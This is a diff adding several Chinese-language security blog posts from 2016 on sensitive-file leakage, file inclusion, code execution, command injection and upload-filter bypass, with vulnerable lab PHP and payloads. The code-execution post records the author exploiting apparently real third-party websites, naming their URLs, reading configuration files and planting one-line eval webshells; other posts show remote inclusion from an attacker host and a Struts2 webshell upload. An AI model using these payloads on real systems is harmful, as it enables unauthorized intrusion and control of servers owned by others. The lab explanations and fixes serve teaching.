@@ -87,9 +87,494 @@
 
 
 
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-08-01T00:32:05.000Z"><a href="/2016/08/01/敏感信息泄露/">2016-08-01</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/08/01/敏感信息泄露/">敏感信息泄露</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>软件敏感信息</strong><br>nmap扫描判断操作系统版本<br>中间件类型和版本<br>http返回头部server<br>404报错信息<br>工具：./wahtweb<br><strong>web敏感信息</strong><br>cms类型和版本<br>敏感文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">*phpinfo()信息泄漏</div><div class="line">    http://[ip]/test.php和http://[ip]/phpinfo.php</div><div class="line">* 测试页面泄漏在外网</div><div class="line">    test.cgi、phpinfo.php、info.php等</div><div class="line">* 编辑器备份文件泄漏在外网</div><div class="line">    http://[ip]/.test.php.swp</div><div class="line">    http://[ip]/test.php.bak</div><div class="line">    http://[ip]/test.jsp.old</div><div class="line">    http://[ip]/cgi~</div><div class="line">    常见编辑器备份后缀</div><div class="line">* 版本管理工具(如git)文件信息泄漏</div><div class="line">    http://[ip]/.git/config</div><div class="line">    http://[ip]/CVS/Entriesp</div><div class="line">    http://[ip]/.svn/entriesp</div><div class="line">* HTTP认证泄漏漏洞</div><div class="line">    http://[ip]/basic/index.php</div><div class="line">    Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码</div><div class="line">* 管理后台地址泄漏</div><div class="line">    http://[ip]/login.php</div><div class="line">    http://[ip]/admin.php</div><div class="line">    http://[ip]/manager.php</div><div class="line">    http://[ip]/admin_login.php</div><div class="line">* 泄漏员工邮箱、分机号码</div><div class="line">    泄漏邮箱及分机号码可被社工，也可生成字典</div><div class="line">* 错误页面暴漏信息</div><div class="line">    面熟sql错误、php错误、暴漏cms版本等</div><div class="line">* 探针文件</div><div class="line">* robots.txt</div><div class="line">* phpMyAdmin</div><div class="line">* 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等)</div><div class="line">* 其他</div></pre></td></tr></table></figure></p>
+<p><strong>网络信息泄露</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">* DNS域传送漏洞</div><div class="line">* 运维监控系统弱口令、网络拓扑泄漏</div><div class="line">    zabbix弱口令、zabbix sql注入等</div></pre></td></tr></table></figure></p>
+<p><strong>第三方软件应用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">* github上源码、数据库、邮箱密码泄漏</div><div class="line">    搜类似：smtp 163 password关键字</div><div class="line">* 百度网盘被员工不小心上传敏感文件</div><div class="line">* QQ群被员工不小心上传敏感文件</div></pre></td></tr></table></figure></p>
+<p><strong>敏感信息搜集工具</strong><br>后面讲具体工具使用<br><strong>第一个扫描器</strong><br>git clone <a href="https://github.com/junmoxiao/cms_identify.git下载扫描器cms" target="_blank" rel="external">https://github.com/junmoxiao/cms_identify.git下载扫描器cms</a><br>主要是扫描cms的类型和版本<br>主要是看代码identify_cms.py<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/1.png?raw=true" alt="image"><br>从github上面下载cms<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/2.png?raw=true" alt="image"><br>进入到这个目录之后运行python脚本<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/3.png?raw=true" alt="image"><br>好啦运行之后扫描<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/4.png?raw=true" alt="image"><br><strong>第二个扫描的软件</strong><br>whatweb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/urbanadventurer/WhatWeb.git</div></pre></td></tr></table></figure></p>
+<p>需要下载一个ruby<br>下载源文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget http://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.3-p0.tar.gz</div></pre></td></tr></table></figure></p>
+<p>tar zxf ruby-1.9.3-p0.tar.gz<br>cd ruby-1.9.3-p0<br>./configure –prefix=/usr/local –disable-install-doc –with-opt-dir=/usr/local/lib<br>make &amp;&amp; make install<br>安装好之后进入whatweb<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/5.png?raw=true" alt="image"><br><strong>第三个扫描的软件</strong><br>git clone <a href="https://github.com/ring04h/weakfilescan.git" target="_blank" rel="external">https://github.com/ring04h/weakfilescan.git</a><br>下载weakfiescan<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/6.png?raw=true" alt="image"><br>可以扫描出网站的信息<br><strong>第四个扫描软件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/lijiejie/BBScan.git</div></pre></td></tr></table></figure></p>
+<p>下载BBScan<br>进入到这个目录<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/7.png?raw=true" alt="image"><br>检测敏感信息泄露<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/10/8.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-30T12:58:16.000Z"><a href="/2016/07/30/文件包含漏洞/">2016-07-30</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/30/文件包含漏洞/">文件包含漏洞</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>原理</strong><br>传入的文件名没有经过合理的校验，或者被过滤，从而操作了预想之外的文件，就可以导致文件泄露甚至恶意的代码注入<br><strong>漏洞分类</strong><br><strong>本地文件包含</strong><br>  上传木马，包含<br>  读文件<br>  日志文件<br>   phpinfo可以包含临时文件<br><strong>远程文件包含</strong><br>  保证php.ini中allow_url_fopen和 allow_url_include打开<br><strong>常见的文件包含的函数</strong><br>        include()                 发生错误时继续执行   用到时加载<br>     include_once()包含一次<br>     require()输出错误信息，终止程序运行，一开始就加载<br>    require_once()程序只调用一次   表示已加载的不加载<br><strong>利用条件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户能够控制该动态变量</div><div class="line">**漏洞危害**</div><div class="line">执行任意代码</div><div class="line">包含恶意文件控制网站</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
+<p>看到参数，校验不严格，存在文件包含漏洞<br>&lt;?<br>$a=$_GET[‘file’];<br>include($a);<br>?&gt;<br>触发条件是include()<br>用这个代码搭建一个自己的环境<br><strong>本地文件包含</strong><br>   因为没有做过过滤，可以执行<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/1.png?raw=true" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if ($_GET[&apos;page&apos;]) &#123; </div><div class="line">include &quot;./action/&quot;.$_GET[&apos;page&apos;].&quot;.php&quot;; </div><div class="line">&#125; else &#123; </div><div class="line">include &quot;./action/show.php&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个文件是%00截断<br><code>http://127.0.0.1:8088/dome/include.php?page=../../phpinfo.php%00</code><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/2.png?raw=true" alt="image"></p>
+<p>#远程文件包含<br>php.ini中allow_url_include=ON<br>如: require_once $basePath.’/action/m_share.php’<br>构造:/?param=<a href="http://attacker/phpshell.txt?" target="_blank" rel="external">http://attacker/phpshell.txt?</a>  注意?用来使后面变为一个查询值，起到截断作用，亦或者用%00截断<br><a href="http://127.0.0.1:8088/dome/include.php?file=http://www.dlam.ml/" target="_blank" rel="external">http://127.0.0.1:8088/dome/include.php?file=http://www.dlam.ml/</a><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/3.png?raw=true" alt="image"><br>  <strong>文件包含漏洞的实列</strong><br>找了好久都没有找到文件包含的实列<br>用别人的吧<br>读取一些信息</p>
+<p>但是好像并不能远程文件包含</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-30T12:20:08.000Z"><a href="/2016/07/30/任意代码执行漏洞/">2016-07-30</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/30/任意代码执行漏洞/">任意代码执行漏洞</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>漏洞原理</strong><br>：<br>当应用调用一些能将字符串转换为代码的函数时，没有考虑安全性，用户是否可以控制这个字符，造成代码注入漏洞，如php中的eval函数，可以将字符串代表的代码作为php代码执行<br><strong>相关函数</strong><br>：<br>php:eval assert<br>python:exec<br>phpcms中的string2array函数<br>array(  //这个是字符串形式的数组，它并不是数组，而是字符串<br>    ‘upload_maxsize’ =&gt; ‘2048’,<br>    ‘upload_allowext’ =&gt; ‘jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf’,<br>    ‘watermark_enable’ =&gt; ‘1’,<br>    ‘watermark_minwidth’ =&gt; ‘300’,<br>    ‘watermark_minheight’ =&gt; ‘300’,<br>    ‘watermark_img’ =&gt; ‘/statics/images/water/mark.png’,<br>    ‘watermark_pct’ =&gt; ‘85’,<br>    ‘watermark_quality’ =&gt; ‘80’,<br>    ‘watermark_pos’ =&gt; ‘9’,<br>)<br>function string2array($data) {<br>    //这个函数可以将字符串$data转化为数组<br>    if($data == ‘’)<br>        return array();<br>    @eval(“\$array = $data;”);<br>        return $array;<br>}<br><strong>漏洞危害</strong><br>：<br>执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">让网站写shell</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
+<p><strong>漏洞分类</strong><br>：<br>执行代码的函数：eval.assert<br>callback函数：preg_replace+ /e模式<br>反序列化：unserialize()反序列化函数<br><strong>漏洞挖掘</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">框架找漏洞，如thinkphp:</div><div class="line">inurl:index.php intext:Thinkphp 2.1</div><div class="line">框架的URL格式如下：</div><div class="line"> Site:Port/Module name/Method name/Property name/Preperty value</div><div class="line"> Site:Port/index.php?m=Module_name&amp;f=Method_name&amp;v=Preperty_value</div><div class="line"> </div><div class="line"> www.xx.com:88/News/show/id/328</div><div class="line"> www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23</div></pre></td></tr></table></figure></p>
+<p> <strong>搭建环境的代码</strong><br>是四个代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">eval(&quot;\$ret = $data;&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://192.168.188.66/code_inject/2/?data=&apos;);phpinfo();//</div><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo &quot;\$ret = &apos;$data&apos;;&quot;;</div><div class="line">eval(&quot;\$ret = strtolower(&apos;$data&apos;);&quot;);</div><div class="line">eval(&quot;\$ret = strtolower(&apos;&apos;);phpinfo();// &apos;);&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo &quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;;</div><div class="line">eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure>
+<p><a href="http://192.168.188.66/code_inject/3/?data=&quot;);phpinfo();//" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=&quot;);phpinfo();//</a><br><a href="http://192.168.188.66/code_inject/3/?data=(&#39;${" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=(&#39;${</a> phpinfo()})<br><a href="http://192.168.188.66/code_inject/3/?data=(&#39;${" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=(&#39;${</a> @eval($_POST[99])})</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo $data;</div><div class="line">preg_replace(&apos;/&lt;data&gt;(.*)&lt;\/data&gt;/e&apos;, &apos;$ret = &quot;\\1&quot;;&apos;, $data);</div><div class="line">echo $ret;</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;$&#123; phpinfo()&#125;&lt;/data&gt;</div><div class="line">http://192.168.188.66/code_inject/4/?data=%3Cdata%3E&#123;$&#123;phpinfo()&#125;&#125;%3C/data%3E</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;&#123;$&#123; @eval($_POST[99])&#125;&#125;&lt;/data&gt;</div></pre></td></tr></table></figure>
+<p><a href="http://www.shichidachina.com/News/detail/item/$%7B%20exit(phpinfo())%7D" target="_blank" rel="external">http://www.shichidachina.com/News/detail/item/$%7B%20exit(phpinfo())%7D</a><br>exit（）不显示多余的信息<br><a href="http://www.shichidachina.com/News/detail/item/$%7B%20phpinfo()%7D" target="_blank" rel="external">http://www.shichidachina.com/News/detail/item/$%7B%20phpinfo()%7D</a><br><strong>google搜索</strong><br>：intext:thinkphp intext:”Fast &amp; Simple OOP PHP Framework” intext:”2.1”<br>首先代码执行漏洞查找到一个站之后，点开站的根路径然后点可能跳转的目录，找到参数，在参数后面写上执行的测试代码</p>
+<p>($phpinfo())<br>index.php?m=module_name&amp;a=action_name&amp;id=1<br>/?m=module_name&amp;a=action_name&amp;id=1<br>/module_name&amp;a=action_name/id/1<br>module_name/action_name/id/1/page/2<br>/press/info/id/155<br>模块名/ 方法/参数/参数值<br>/press/info/id /${ phpinfo()}<br>找到两个存在代码执行漏洞的站<br>1.<img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/1.png?raw=true" alt="image"></p>
+<p>2.将参数值变成测试代码${phpinfo()<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/2.png?raw=true" alt="image"><br>获取当前工作的路径 {$ {print(getcwd())}}<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/3.png?raw=true" alt="image"><br>读取文件{$ {exit(var_dump(file_get_contents($_POST[f])))}}<br>f=d:/freehost/tianlonghotel/web/en/Conf/config.php</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/4.png?raw=true" alt="image"></p>
+<p>3.写webshell<br><a href="http://www.tianlonghotel.com.cn/index2.php/Index/news/id/{$" target="_blank" rel="external">http://www.tianlonghotel.com.cn/index2.php/Index/news/id/{$</a> {exit(var_dump(file_put_contents($_POST[f],$_POST[d])))}}<br>f=help2.php&amp;d=&lt;? eval($_POST[99])&gt;<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/5.png?raw=true" alt="image"></p>
+<p>没有权限换一种方式<br>${ @eval($_POST[99])}后面写上一句话木马<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/6.png?raw=true" alt="image"></p>
+<p>第二个网站<br>使用之前的方法找到之后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/7.png?raw=true" alt="image"><br>直接写一句话木马<br><a href="http://bkjxgc.jlau.edu.cn/indxe.php/Notice/show/id/${" target="_blank" rel="external">http://bkjxgc.jlau.edu.cn/indxe.php/Notice/show/id/${</a> @eval($_POST[99])}</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/8.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-29T07:44:30.000Z"><a href="/2016/07/29/命令执行漏洞/">2016-07-29</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/29/命令执行漏洞/">命令执行漏洞</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数<br>主要是以Php为主，php中可以调用外部程序的常见的函数：system,exec,shell_exec,passthru,popen,proc_popen </p>
+<h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><ul>
+<li>1.应用调用执行系统命令的函数</li>
+<li>2.将用户输入作为系统命令的参数拼接到命令行中</li>
+<li>3.没有对用户进行输入过滤或者过滤不严<blockquote>
+<ul>
+<li>利用goole搜索 inurl:关键字：action<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2></li>
+</ul>
+</blockquote>
+</li>
+<li>1.代码层过滤不严</li>
+<li>2.系统的漏洞造成</li>
+<li><p>3调用.第三方组件存在代码执行漏洞<br>如WordPress中用来处理图片的ImageMagick组件<br>JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等) ThinkPHP命令执行</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol>
+<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
+<li>反弹shell</li>
+<li>控制整个网站甚至控制服务器</li>
+<li>进一步内网渗透</li>
+<li>等等</li>
+</ol>
+</li>
+</ul>
+<h3 id="漏洞可能的代码"><a href="#漏洞可能的代码" class="headerlink" title="漏洞可能的代码"></a>漏洞可能的代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1. system(&quot;$arg&quot;);  //直接输入即可2. system(&quot;/bin/prog $arg&quot;);  //直接输入;ls3. system(&quot;/bin/prog -p $arg&quot;);  //和2一样4. system(&quot;/bin/prog --p=\&quot;$arg\&quot;&quot;);  //可以输入&quot;;ls;&quot;5. system(&quot;/bin/prog --p=&apos;$arg&apos;&quot;);  //可以输入&apos;;ls;&apos;</div></pre></td></tr></table></figure>
+<p>在Linux上，上面的;也可以用|、||代替<br>    ;前面的执行完执行后面的<br>    |是管道符，显示后面的执行结果<br>    ||当前面的执行出错时执行后面的</p>
+<p>在Windows上，不能用;可以用&amp;、&amp;&amp;、|、||代替<br>    &amp;前面的语句为假则直接执行后面的<br>    &amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>    |直接执行后面的语句<br>    ||前面出错执行后面的</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><p>示例一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">       $arg = $_GET[&apos;cmd&apos;];</div><div class="line">        if ($arg)&#123;</div><div class="line">             system(&quot;$arg&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h2><pre><code>1. 尽量少用执行命令的函数或者直接禁用
+2. 参数值尽量使用引号包括
+3. 在使用动态函数之前，确保使用的函数是指定的函数之一
+4. 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义
+</code></pre><p>&lt;?php<br>    $arg = $_GET[‘cmd’];<br>    // $arg = addslashes($arg);<br>    $arg = escapeshellcmd($arg);  //拼接前就处理<br>    if ($arg) {<br>        system(“ls -al ‘$arg’”);<br>    }<br>?&gt;</p>
+<h2 id="下面是struct2漏洞实列"><a href="#下面是struct2漏洞实列" class="headerlink" title="下面是struct2漏洞实列"></a><strong>下面是struct2漏洞实列</strong></h2><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/1.png?raw=true" alt="image"><br>存在漏洞，下载一个漏洞的利用工具<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/2.png?raw=true" alt="image"><br>可以任意执行命令，在目标信息中获取路径信息<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/3.png?raw=true" alt="image"><br>在文件上传可以传一个jsp的小马<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/4.png?raw=true" alt="image"></p>
+<p>ok用菜刀连接就可以使用<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/5.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-26T11:29:50.000Z"><a href="/2016/07/26/文件上传之绕过上传/">2016-07-26</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/26/文件上传之绕过上传/">文件上传之绕过上传</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>一般防止上传漏洞手法</strong><br>1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证<br>    //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少<br>    //服务器开销，而服务端验证才可以真正防御攻击者。  2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法</p>
+<p><strong>客户端检测客户端验证代码形如下</strong>：</p>
+<p><table bgcolor="#7FFFD4"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;</div><div class="line"> &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line"> &lt;title&gt;图片上传&lt;/title&gt;</div><div class="line"> &lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line"> function checkFile()&#123;</div><div class="line">    var flag = false;</div><div class="line">    var str = document.getElementById(&quot;file&quot;).value;</div><div class="line">    str = str.substring(str.lastIndexOf(&apos;.&apos;) + 1);</div><div class="line">    var arr = new Array(&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;);</div><div class="line">    for (var i=0;&lt;arr.length;i++)&#123;</div><div class="line">        if(str==arr[i])&#123;</div><div class="line">            flag = true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if(!flag)&#123;</div><div class="line">        alert(&apos;文件不合法！&apos;);</div><div class="line">    &#125;</div><div class="line">    return flag;</div><div class="line"> &#125;</div><div class="line"> &lt;/script&gt;&lt;/head&gt;&lt;body&gt;</div><div class="line"> &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; onsubmit=&quot;checkFile()&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br/&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt;</div><div class="line"> &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></table></p>
+<p><br>接收文件的脚本upload.php代码如下：   </p>
+<p><table><tr><td bgcolor="#7FFFD4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?phpif(isset($_POST[&quot;submit&quot;]))&#123;</div><div class="line">    $name = $_FILES[&apos;file&apos;][&apos;name&apos;];</div><div class="line">    $name = md5(date(&apos;Y-m-d h:m:s&apos;)).strrchr($name,&quot;.&quot;);</div><div class="line">    $size = $_FILES[&apos;file&apos;][&apos;size&apos;];</div><div class="line">    $tmp = $_FILES[&apos;file&apos;][&apos;tem_name&apos;];</div><div class="line">    move_uploaded_file($tmp,$name);</div><div class="line">    echo &quot;文件上传成功！path：&quot;.$name;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></td></tr></table></p>
+<p><br>绕过：1、可以用firebug将form表单中的onsubmit事件删除，这样就可以绕过验证。<br>2、使用Burp Suite：<br>    1）先将木马文件的扩展名改为一张正常图片的扩展名，如jpg<br>    2）上传时使用Burp Suite拦截数据包，将木马文件扩展名改为php就可绕过客户端验证。<br>    注意：这里修改文件名字后，请求头中的Content-Length的值也要改</p>
+<p>服务端检测服务端分为6项：</p>
+<ul>
+<li>黑名单与白名单验证</li>
+<li>MIME验证</li>
+<li>目录验证</li>
+<li>截断上传攻击</li>
+<li>文件攻击</li>
+<li>检测文件内容</li>
+</ul>
+<p>黑名单与白名单验证</p>
+<pre><code>* 黑名单过滤方式
+</code></pre><p><table><tr><td bgcolor="#7FFFD4"> </td></tr></table></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$Blacklist = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx&apos;);    //黑名单if (isset($_POST[&quot;submit&quot;]))&#123;</div><div class="line">    $name = $FILES[&apos;file&apos;][&apos;name&apos;];    //接收文件名</div><div class="line">    $extension = substr(strrchr($name, &quot;.&quot;) , 1);    //得到扩展名</div><div class="line">    $boo = false;</div><div class="line">    foreach ($Blaklist as $key =&gt; $value)&#123;</div><div class="line">        if ($value==$extension) &#123;    //迭代判断是否命中</div><div class="line">            $boo = true;</div><div class="line">            break;     //命中后直接退出循环</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (!$boo) &#123;    //若没有被命中，则进行上传操作</div><div class="line">        $size = $_FILES[&apos;file&apos;][&apos;size&apos;];  //接收文件大小</div><div class="line">        $tmp = $FILES[&apos;file&apos;][&apos;temp_name&apos;];   //临时路径</div><div class="line">        move_uploaded_file($tmp, $name);   //移动临时文件到当前文件目录</div><div class="line">    &#125; else &#123;</div><div class="line">        echo &quot;文件不合法!!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
